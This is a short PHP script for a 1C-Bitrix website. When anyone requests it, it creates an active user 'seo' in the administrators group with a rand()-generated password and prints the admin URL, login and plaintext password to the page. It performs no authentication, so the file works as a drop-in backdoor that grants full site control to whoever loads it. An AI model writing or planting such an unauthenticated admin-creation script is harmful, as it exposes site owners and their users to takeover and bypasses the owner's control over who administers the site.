<? require($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/include/prolog_before.php"); ?>
<?php
function generate_password($number)
{
    $arr = array('a','b','c','d','e','f',
        'g','h','i','j','k','l',
        'm','n','o','p','r','s',
        't','u','v','x','y','z',
        'A','B','C','D','E','F',
        'G','H','I','J','K','L',
        'M','N','O','P','R','S',
        'T','U','V','X','Y','Z',
        '1','2','3','4','5','6',
        '7','8','9','0','.',',',
        '(',')','[',']','!','?',
        '&','^','%','@','*','$',
        '<','>','/','|','+','-',
        '{','}','`','~');
    // Генерируем пароль
    $pass = "";
    for($i = 0; $i < $number; $i++)
    {
        // Вычисляем случайный индекс массива
        $index = rand(0, count($arr) - 1);
        $pass .= $arr[$index];
    }
    return $pass;
}

$passw = generate_password(10);

$user = new CUser;
$arFields = Array(
    "EMAIL"             => "support@profitkit.ru",
    "LOGIN"             => "seo",
    "LID"               => "ru",
    "ACTIVE"            => "Y",
    "GROUP_ID"          => array(1),
    "PASSWORD"          => $passw,
    "CONFIRM_PASSWORD"  => $passw,
);

$ID = $user->Add($arFields);
if (intval($ID) > 0)
    echo "Пользователь успешно добавлен.<br>http://".$_SERVER['HTTP_HOST']."/bitrix/<br>seo<br>".$passw;
else
    echo $user->LAST_ERROR;
?>